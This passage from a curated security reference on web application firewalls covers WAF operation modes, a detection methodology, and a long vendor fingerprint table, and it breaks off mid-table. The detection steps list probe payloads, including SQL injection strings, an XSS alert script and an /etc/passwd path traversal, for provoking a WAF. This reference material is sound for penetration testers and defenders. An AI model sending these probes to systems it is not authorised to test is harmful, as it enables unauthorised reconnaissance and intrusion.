# Awesome WAF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg "Awesome")](https://github.com/0xinfection/awesome-waf)
> A curated list of awesome WAF stuff. 🔥
>
> __Foreword:__ This was originally my own collection on WAFs. I am open-sourcing it in the hope that it will be useful for pentesters and researchers out there. You might want to keep this repo on a watch, since it will be updated regularly. "The community just learns from each other." __#SharingisCaring__

![Main Logo](images/how-wafs-work.png 'How wafs work')

__A Concise Definition:__ A web application firewall is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components. *(Source: [PCI DSS IS 6.6](https://www.pcisecuritystandards.org/documents/information_supplement_6.6.pdf))*

Feel free to [contribute](CONTRIBUTING.md).

### Contents:
- [Introduction](#introduction)
    - [How WAFs Work](#how-wafs-work)
    - [Operation Modes](#operation-modes)
- [Testing Methodology](#testing-methodology)
    - [Where To Look](#where-to-look)
    - [Detection Techniques](#detection-techniques)
- [WAF Fingerprints](#waf-fingerprints)
- [Evasion Techniques](#evasion-techniques)
    - [Fuzzing/Bruteforcing](#fuzzingbruteforcing)
    - [Regex Reversing](#regex-reversing)
    - [Obfuscation/Encoding](#obfuscation)
    - [Browser Bugs](#browser-bugs)
    - [HTTP Header Spoofing](#request-header-spoofing)
    - [Google Dorks Approach](#google-dorks-approach)
- [Known Bypasses](#known-bypasses)
- [Awesome Tooling](#awesome-tools)
    - [Fingerprinting](#fingerprinting)
    - [Testing](#testing)
    - [Evasion](#evasion)
- [Blogs & Writeups](#blogs-and-writeups)
- [Video Presentations](#video-presentations)
- [Research Presentations & Papers](#presentations--research-papers)
    - [Research Papers](#research-papers)
    - [Presentation Slides](#presentations)
- [Licensing & Credits](#credits--license)

## Introduction:
### How WAFs Work:
- Using a set of rules to distinguish between normal requests and malicious requests.
- Sometimes they use a learning mode to add rules automatically through learning about user behaviour.

### Operation Modes:
- __Negative Model (Blacklist based)__ - A blacklisting model uses pre-set signatures to block web traffic that is clearly malicious, and signatures designed to prevent attacks which exploit certain website and web application vulnerabilities. Blacklisting model web application firewalls are a great choice for websites and web applications on the public internet, and are highly effective against an major types of DDoS attacks. Eg. Rule for blocking all `<script>*</script>` inputs.
- __Positive Model (Whitelist based)__ - A whitelisting model only allows web traffic according to specifically configured criteria. For example, it can be configured to only allow HTTP GET requests from certain IP addresses. This model can be very effective for blocking possible cyber-attacks, but whitelisting will block a lot of legitimate traffic. Whitelisting model firewalls are probably best for web applications on an internal network that are designed to be used by only a limited group of people, such as employees.
- __Mixed/Hybrid Model (Inclusive model)__ - A hybrid security model is one that blends both whitelisting and blacklisting. Depending on all sorts of configuration specifics, hybrid firewalls could be the best choice for both web applications on internal networks and web applications on the public internet.

## Testing Methodology:
### Where To Look:
- Always look out for common ports that expose that a WAF, namely `80`, `443`, `8000`, `8008`, `8080` and `8088` ports.
    > __Tip:__ You can use automate this easily by commandline using tools like like [cURL](https://github.com/curl/curl).
- Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
- Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
- Some often alter headers and jumble characters to confuse attacker (eg. Netscaler, Big-IP).
- Some expose themselves in the `Server` header (eg. Approach, WTS WAF).
- Some WAFs expose themselves in the response content (eg. DotDefender, Armor, Sitelock).
- Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight, 360 WAF).

### Detection Techniques:
To identify WAFs, we need to (dummy) provoke it.
1. Make a normal GET request from a browser, intercept and record response headers (specifically cookies).
2. Make a request from command line (eg. cURL), and test response content and headers (no user-agent included).
3. Make GET requests to random open ports and grab banners which might expose the WAFs identity.
4. If there is a login page somewhere, try some common (easily detectable) payloads like `" or 1 = 1 --`.
5. If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
6. Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
7. Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
8. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
9. Many a times, the WAF varies the `Server` header upon different types of interactions.
10. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
    > __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
11. Side Channel Attacks - Examine the timing behaviour of the request and response content. 

## WAF Fingerprints
Wanna fingerprint WAFs? Lets see how.
> __NOTE__: This section contains manual WAF detection techniques. You might want to switch over to [next section](#evasion-techniques). 

<table>
    <tr>
        <td align="center"><b>WAF</b></td>
        <td align="center"><b>Fingerprints</b></td>
    </tr>
    <tr>
        <td>
            360 Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability:</b> Easy </li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Returns status code <code>493</code> upon unusual requests.</li>
                    <li>On viewing source-code of error page, you will find reference to <code>wzws-waf-cgi/</code> directory.</li>
                    <li>Blocked response page source contains:
                    <ul>
                        <li>Reference to <code>wangshan.360.cn</code> URL.</li>
                        <li><code>Sorry! Your access has been intercepted because your links may threaten website security.</code> text snippet.</li>
                    </ul>
                    <li>Response headers contain <code>X-Powered-By-360WZB</code> Header.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            aeSecure
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains <code>aesecure_denied.png</code> image (view source to see).</li>
                    <li>Response headers contain <code>aeSecure-code</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Airlock (Phion/Ergon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate/Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> headers may contain:</li>
                    <ul>
                        <li><code>AL-SESS</code> cookie field name (case insensitive).</li>
                        <li><code>AL-LB</code> value (case insensitive).</li>
                    </ul>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Server detected a syntax error in your request</code> text.</li>
                        <li><code>Check your request and all parameters</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            AlertLogic Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability:</b> Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>We are sorry, but the page you are looking for cannot be found</code> text snippet.</li>
                        <li><code>The page has either been removed, renamed or temporarily unavailable</code> text.</li>
                        <li><code>404 Not Found</code> in red letters.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Aliyundun Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability:</b> Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Sorry, your request has been blocked as it may cause potential threats to the server's security</code> text snippet.</li>
                        <li>Reference to <code>errors.aliyun.com</code> site URL.</li>
                    </ul>
                    <li>Blocked response code returned is <code>405</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Anquanbao WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Returns blocked HTTP response code <code>405</code> upon malicious requests.</li>
                    <li>Blocked response content may contain <code>/aqb_cc/error/</code> or <code>hidden_intercept_time</code>.</li>
                    <li>Response headers contain <code>X-Powered-by-Anquanbao</code> header field.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Anyu Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains <code>Sorry! your access has been intercepted by AnYu</code></li>
                    <li>Blocked response page contains <code>AnYu- the green channel</code> text.</li>
                    <li>Response headers may contain unusual header <code>WZWS-RAY</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Application Security Manager (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains warning<br>
                        <code>The requested URL was rejected. Please consult with your administrator.</code>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Approach Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content may contain:</li>
                        <ul>
                            <li><code>Approach Web Application Firewall Framework</code> heading.</li>
                            <li><code>Your IP address has been logged and this information could be used by authorities to track you.</code> warning.</li>
                            <li><code>Sorry for the inconvenience!</code> keyword.</li>
                            <li><code>Approach infrastructure team</code> text snippet.</li>
                        </ul>
                    <li><code>Server</code> header has field value set to <code>Approach</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Armor Defense
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains:
                        <ul>
                            <li><code>This request has been blocked by website protection from Armor</code> text.</li>
                            <li><code>If you manage this domain please create an Armor support ticket</code> snippet.</li>
                        </ul>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ASP.NET Generic (IIS)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain <code>X-ASPNET-Version</code> header value.</li>
                    <li>Blocked response page content may contain:</li>
                        <ul>
                            <li><code>This generic 403 error means that the authenticated user is not authorized to use the requested resource</code>.</li>
                            <li><code>Error Code 0x00000000<</code> keyword.</li>
                        </ul>
                    <li><code>X-Powered-By</code> header has field value set to <code>ASP.NET</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            AWS (Amazon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might contain:
                        <ul>
                            <li><code>AWSALB</code> cookie field value.</li>
                            <li><code>X-AMZ-ID</code> header.</li>
                            <li><code>X-AMZ-REQUEST-ID</code> header.</li>
                        </ul>
                    </li>
                    <li>Response page may contain:
                        <ul>
                            <li><code>Access Denied</code> in their keyword.</li>
                            <li>Request token ID with length from 20 to 25 between <code>RequestId</code> tag.</li>
                        </ul>
                    </li>
                    <li><code>Server</code> header field contains <code>awselb/2.0</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Baidu Yunjiasu
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header may contain <code>Yunjiasu-nginx</code> value.</li>
                    <li><code>Server</code> header may contain <code>Yunjiasu</code> value.
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Barikode Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content contains:
                        <ul>
                            <li><code>BARIKODE</code> keyword.</li>
                            <li><code>Forbidden Access</code> text snippet in <code>h1</code>.</li>
                        </ul>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Barracuda WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response cookies may contain <code>barra_counter_session</code> value.</li>
                    <li>Response headers may contain <code>barracuda_</code> keyword.</li>
                </ul>
                <li>Response page contains:</li>
                <ul>
                    <li><code>You have been blocked</code> heading.</li>
                    <li><code>You are unable to access this website</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Bekchy (Faydata)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response headers contains <code>Bekchy - Access Denied</code>.</li>
                    <li>Blocked response page contains reference to <code>https://bekchy.com/report</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BitNinja Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page may contain:</li>
                    <ul>
                        <li><code>Security check by BitNinja</code> text snippet.</li>
                        <li><code>your IP will be removed from BitNinja</code>.</li>
                        <li><code>Visitor anti-robot validation</code> text snippet.</li>
                        <li><code>(You will be challenged by a reCAPTCHA page)</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Bluedon IST
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>BDWAF</code> field value.</li>
                    <li>Blocked response page contains to <code>Bluedon Web Application Firewall</code> text snippet..</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BIG-IP ASM (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain <code>BigIP</code> or <code>F5</code> keyword value.</li>
                    <li>Response header fields may contain <code>X-WA-Info</code> header.</li>
                    <li>Response headers might have jumbled <code>X-Cnection</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BinarySec WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>binarysec</code> keyword value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BlockDos
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains value <code>BlockDos.net</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            CDN NS Application Gateway
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>CdnNsWAF Application Gateway</code> text snippet.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cerber (WordPress)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:
                    <ul>
                        <li><code>We're sorry, you are not allowed to proceed</code> text snippet.</li>
                        <li><code>Your request looks suspicious or similar to automated requests from spam posting software</code> warning.</li>
                    </ul> 
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ChinaCache Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Powered-by-ChinaCache</code> field.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Chuangyu WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page has reference to:
                        <ul>
                            <li><code>365cyd.com</code> or <code>365cyd.net</code> URL.</li>
                            <li>Reference to help page at <code>http://help.365cyd.com/cyd-error-help.html?code=403</code>.</li>
                        </ul>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cisco ACE XML Gateway
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header has value <code>ACE XML Gateway</code> set.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudbric Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content contains:</li>
                    <ul>
                        <li><code>Malicious Code Detected</code> heading.</li>
                        <li><code>Your request was blocked by Cloudbric</code> text snippet.</li>
                        <li>Reference to <code>https://cloudbric.zendesk.com</code> URL.
                        <li><code>Cloudbric Help Center</code> text.</li>
                        <li>Page title starting with <code>Cloudbric | ERROR!</code>.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudflare 
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might have <code>cf-ray</code> field value.</li>
                    <li><code>Server</code> header field has value <code>cloudflare</code>.</li>
                    <li><code>Set-Cookie</code> response headers have <code>__cfuid=</code> cookie field.</li>
                    <li>Page content might have <code>Attention Required!</code> or <code>Cloudflare Ray ID:</code>.</li>
                    <li>You may encounter <code>CLOUDFLARE_ERROR_500S_BOX</code> upon hitting invalid URLs.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudfront (Amazon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains <code>Generated by cloudfront (CloudFront)</code> error upon malicious request.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Comodo Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>Protected by COMODO WAF</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            CrawlProtect (Jean-Denis Brun)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response cookies might contain <code>crawlprotect</code> cookie name.</li>
                    <li>Block Page title has <code>CrawlProtect</code> keyword in it.</li>
                    <li>Blocked response content contains value<br> <code>This site is protected by CrawlProtect !!!</code> upon malicious request.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Deny-All Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content contains value <code>Condition Intercepted</code>.</li>
                    <li><code>Set-Cookie</code> header contains cookie field <code>sessioncookie</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Distil Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain field value <code>X-Distil-CS</code> in all requests.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Pardon Our Interruption...</code> heading.</li>
                        <li><code>You have disabled javascript in your browser.</code> text snippet.</li>
                        <li><code>Something about your browser made us think that you are a bot.</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            DoSArrest Internet Security
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain field value <code>X-DIS-Request-ID</code>.</li>
                    <li><code>Server</code> header contains <code>DOSarrest</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            dotDefender
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value<br> <code>dotDefender Blocked Your Request</code>.</li>
                    <li>Blocked response headers contain <code>X-dotDefender-denied</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            DynamicWeb Injection Check
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response headers contain <code>X-403-Status-By</code> field with value <code>dw-inj-check</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            EdgeCast (Verizon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value<br> <code>Please contact the site administrator, and provide the following Reference ID:EdgeCast Web Application Firewall (Verizon)</code>.</li>
                    <li>Blocked response code returns <code>400 Bad Request</code> on malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Expression Engine (EllisLab)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page returns <code>Invalid URI</code> generally.</li>
                    <li>Blocked response content contains value <code>Invalid GET Request</code> upon malicious GET queries.</li>
                    <li>Blocked POST type queries contain <code>Invalid POST Request</code> in response content.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            FortiWeb Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>FORTIWAFSID=</code> on malicious requests.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li>Reference to <code>.fgd_icon</code> image icon.</li>
                        <li><code>Server Unavailable!</code> as heading.</li>
                        <li><code>Server unavailable. Please visit later.</code> as text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            GoDaddy Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains value<br> <code>Access Denied - GoDaddy Website Firewall</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            GreyWizard Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page conatins:
                        <ul>
                            <li><code>Grey Wizard</code> as title.</li>
                            <li><code>Contact the website owner or Grey Wizard</code> text snippet.</li>
                            <li><code>We've detected attempted attack or non standard traffic from your IP address</code> text snippet.</li>
                        </ul>
                    </li>
                    <li><code>Server</code> header contain <code>greywizard</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            HyperGuard Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> header has cookie field <code>ODSESSION=</code> in response headers.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            IBM DataPower
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contains field value value <code>X-Backside-Transport</code> with value <code>OK</code> or <code>FAIL</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Incapsula (Imperva)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content may contain:</li>
                        <ul>
                            <li><code>Powered By Incapsula</code> text snippet.</li>
                            <li><code>Incapsula incident ID</code> keyword.</li>
                            <li><code>_Incapsula_Resource</code> keyword.</li>
                            <li><code>subject=WAF Block Page</code> keyword.</li>
                        </ul>
                    <li>Normal GET request headers contain <code>visid_incap</code> value.</li>
                    <li>Response headers may contain <code>X-Iinfo</code> header field name.</li>
                    <li><code>Set-Cookie</code> header has cookie field <code>incap_ses</code> and <code>visid_incap</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Immunify360 (CloudLinux Inc.)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contain <code>imunify360-webshield</code> keyword.</li>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>Powered by Imunify360</code> text snippet.</li>
                        <li><code>imunify360 preloader</code> if response type is JSON.</li>
                    </ul>
                    <li>Blocked response page contains <code>protected by Imunify360</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ISAServer
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>The ISA Server denied the specified Uniform Resource Locator (URL)</code> text snippet.</li>
                        <li><code>The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.</code> text snippet</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Janusec Application Gateway
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page has image displaying <code>JANUSEC</code> name and logo.</li>
                    <li>Blocked response page displays <code>Janusec Application Gateway</code> on malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Jiasule Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to <code>static.jiasule.com/static/js/http_error.js</code> URL.</li>
                    <li><code>Set-Cookie</code> header has cookie field <code>__jsluid=</code> or <code>jsl_tracking</code>in response headers.</li>
                    <li><code>Server</code> header has <code>jiasule-WAF</code> keywords.</li>
                    <li>Blocked response content has <code>notice-jiasule</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            KnownSec Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page displays <code>ks-waf-error.png</code> image (view source to see).</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            KONA Site Defender (Akamai)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>AkamaiGHost</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            LiteSpeed Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header has value set to <code>LiteSpeed</code>.</li>
                    <li><code>Response page contains:</code></li>
                    <ul>
                        <li><code>Proudly powered by LiteSpeed Web Server</code> text.</li>
                        <li>Reference to <code>http://www.litespeedtech.com/error-page</code></li>
                        <li><code>Access to resource on this server is denied.</code></li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Malcare (Inactiv)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page may contains:
                        <ul>
                            <li><code>Blocked because of Malicious Activities</code> text snippet.</li>
                            <li><code>Firewall powered by MalCare</code> text snippet.</li>
                        </ul>
                    </li>
               </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            MissionControl WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header field contains <code>Mission Control Application Shield</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ModSecurity (Trustwave)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate/Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:</li>
                        <ul>
                            <li><code>This error was generated by Mod_Security</code> text snippet.</li>
                            <li><code>One or more things in your request were suspicious</code> text snippet.</li>
                            <li><code>rules of the mod_security module</code> text snippet.</li>
                            <li><code>mod_security rules triggered</code> text snippet.</li>
                            <li>Reference to <code>/modsecurity-errorpage/</code> directory.</li>
                        </ul>
                    <li><code>Server</code> header may contain <code>Mod_Security</code> or <code>NYOB</code> keywords.</li>
                    <li>Sometimes, the response code to an attack is <code>403</code> while the response phrase is <code>ModSecurity Action</code>.
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NAXSI (NBS Systems)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page conatins <code>This Request Has Been Blocked By NAXSI</code>.</li>
                    <li>Response headers contain unusual field <code>X-Data-Origin</code> with value <code>naxsi/waf</code> keyword.</li>
                    <li><code>Server</code> header contains <code>naxsi/waf</code> keyword value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Nemesida Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page conatins <code>Suspicious activity detected. Access to the site is blocked.</code>.</li>
                    <li>Contains reference to email <code>nwaf@{site.tld}</code></li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Netcontinuum (Barracuda)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Session cookies contain <code>NCI__SessionId=</code> cookie field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NevisProxy (AdNovum)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response header cookies contain <code>Navajo</code> keyword.</li>
